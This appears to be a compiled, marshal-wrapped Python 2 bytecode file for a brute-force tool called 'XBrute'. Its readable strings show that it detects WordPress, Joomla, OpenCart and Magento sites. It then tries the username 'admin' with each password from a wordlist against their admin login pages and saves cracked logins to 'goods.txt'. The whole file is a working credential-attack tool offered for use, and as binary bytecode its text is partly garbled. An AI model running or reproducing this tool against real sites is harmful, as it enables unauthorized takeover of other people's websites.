ó
pÍÕ_c           @   s!   d  d l  Z  e  j d  d Ud S(   iÿÿÿÿNsß  c           @   si  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l m Z e j d k r_ e j d  n e j d  d d d     YZ e j	 d GHe  j
   Z d	 Z d
   Z d   Z d   Z d   Z d   Z e d  Z e d  Z yc d GHe e d  j   j   Z e d d  j   j   Z e e e   Z e j e e  Z Wn e j d GHe j   n Xd S(   iÿÿÿÿN(   t   Poolt   ntt   clst   cleart   spec           B   s   e  Z d  Z d Z d Z RS(   s   [1;32ms   [31ms   [0m(   t   __name__t
   __module__t   gt   rt   e(    (    (    s   <Ahmad_Riswanto>R   	   s   s  
           /$$$$$$$                        /$$              
          | $$__  $$                      | $$              
 /$$   /$$| $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$ 
|  $$ /$$/| $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   /$$__  $$
 \  $$$$/ | $$__  $$| $$  \__/| $$  | $$  | $$    | $$$$$$$$
  >$$  $$ | $$  \ $$| $$      | $$  | $$  | $$ /$$| $$_____/
 /$$/\  $$| $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$
|__/  \__/|_______/ |__/       \______/    \___/   \_______/
			#No_Identity / https://t.me/xxyz4
t   adminc         C   s@  y"xt  D]} t j |  d d d } d | j k rM |  j d d  }  n  d | j k rt j |  d d i t d 6| d	 6d d } d
 | j k rù t	 j
 d |  d t d | GHt d d  , } | j d |  d t d | d  Wd  QXPqt	 j d |  d t d | GHq
 Pq
 WWn t	 j d |  GHn Xd  S(   Ns   /wp-login.phpt   timeouti   s   https://s   http://s   wp-admint   datat   logt   pwds   wp-admin/profile.phps   [>>] Good !  ==>  s   /wp-login.php#t   @s	   goods.txtt   as   WordPress : s   
s   [xx] Failed  ==>  (   t   passwordt   requestst   gett   urlt   replacet   textt   sessiont   postR
   R   R   t   opent   writeR   (   t   sitet   passwdR   t   f(    (    s   <Ahmad_Riswanto>t	   wordpress   s     - +#	c         C   sé  yËxÄt  D]¼} t j |  d d d } y6 t j d | j  d } t j d | j  d } Wn d } d } n Xd	 | j k r |  j d
 d	  }  n  d | j k rÅd | j k rÅt j |  d d i t	 d 6| d 6d d 6| d 6d d 6d | 6d d } d | j k r¢d | j k rAt
 j d |  d t	 d | GHqÂt
 j d |  d t	 d | GHt d d  , } | j d |  d t	 d | d  Wd  QXPqÆt
 j d |  d t	 d | GHq
 Pq
 WWn t
 j d |  GHn Xd  S(    Ns   /administrator/index.phpR   i   s#   type="hidden" name="(.*)" value="1"i    s(   type="hidden" name="option" value="(.*)"t    t	   com_logins   https://s   http://t   Joomlat   com_R   t   usernameR   t   en_GBt   langt   optiont   logint   taskt   1s   &amp;task=logouts   0 Cannots   [xx] Failed  ==>  s   /administrator/index.php#R   s   [>>] Good !  ==>  s	   goods.txtR   s	   Joomla : s   
(   R   R   R   t   ret   findallR   R   R   R   R
   R   R   R   R   R   (   R   R   R   t   tokenR&   R   (    (    s   <Ahmad_Riswanto>t   joomla5   s0    
I# +#	c         C   s@  y"xt  D]} t j |  d d d } d | j k rM |  j d d  }  n  d | j k rt j |  d d i t d 6| d	 6d d } d
 | j k rù t	 j
 d |  d t d | GHt d d  , } | j d |  d t d | d  Wd  QXPqt	 j d |  d t d | GHq
 Pq
 WWn t	 j d |  GHn Xd  S(   Ns   /admin/index.phpR   i   s   https://s   http://s   common/loginR   R#   R   s   common/logouts   [>>] Good !  ==>  s   /admin/index.php#R   s	   goods.txtR   s   OpenCart : s   
s   [xx] Failed  ==>  (   R   R   R   R   R   R   R   R   R
   R   R   R   R   R   (   R   R   R   R   (    (    s   <Ahmad_Riswanto>t   opencartU   s     - +#	c         C   s{  y]xVt  D]N} t j |  d d d } y t j d | j  d } Wn d } n Xd | j k rz |  j d d  }  n  d	 | j k rWt j |  d d
 i t	 d 6| d 6| d 6d d 6d d } d | j k r4t
 j d |  d t	 d | GHt d d  , } | j d |  d t	 d | d  Wd  QXPqXt
 j d |  d t	 d | GHq
 Pq
 WWn t
 j d |  GHn Xd  S(   Ns   /adminR   i   s2   <input name="form_key" type="hidden" value="(.*?)"i    t   6Tdfk8negawFvLj5s   https://s   http://t   MagentoR   s   login[username]s   login[password]t   form_keyR   t   dummys   link-logouts   [>>] Good !  ==>  s   /admin#R   s	   goods.txtR   s
   Magento : s   
s   [xx] Failed  ==>  s   [xx] Failed ==>  (   R   R   R   R*   R+   R   R   R   R   R
   R   R   R   R   R   (   R   R   R   R1   R   (    (    s   <Ahmad_Riswanto>t   magentol   s(    
; +#	c         C   sÆ   y¨ t  j |  d d } d | j k r4 t |   ns d | j k rP t |   nW d | j k r{ d | j k r{ t |   n, d | j k r t |   n t j d |  GHWn t j d |  GHn Xd  S(	   NR   i   s
   wp-contents   index.php?route=R!   R"   s   Mage.Cookiess   [xx] Failed ==>  (	   R   R   R   R   R.   R-   R3   R   R   (   R   R   (    (    s   <Ahmad_Riswanto>t   cms   s    s   	 root@youez:~# list : s   	 root@youez:~# thread : R   R   s   listpass.txts"   Files not found! Please try again!(    (    R   t   ost   sysR*   t   multiprocessing.dummyR    t   namet   systemR   R   t   SessionR   R
   R   R-   R.   R3   R4   t	   raw_inputt   sitelistt   gantengR   t   readt
   splitlinest   sitesR   t   intt   ppt   mapt   prR	   t   exit(    (    (    s   <Ahmad_Riswanto>t   <module>   s2   0
		 			(   t   marshalt   loads(    (    (    s   hasil.pyt   <module>   s   